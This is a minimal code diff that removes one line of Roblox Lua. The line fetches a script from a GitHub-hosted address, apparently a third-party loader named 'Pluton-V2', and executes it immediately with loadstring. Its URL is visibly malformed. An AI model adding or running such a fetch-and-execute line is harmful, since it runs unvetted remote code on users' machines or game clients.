@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://githubusercontent.comdaniarsadekov64-lgtm/Pluton-V2/main/chain_files/9cbzp5m3r4.lua"))()
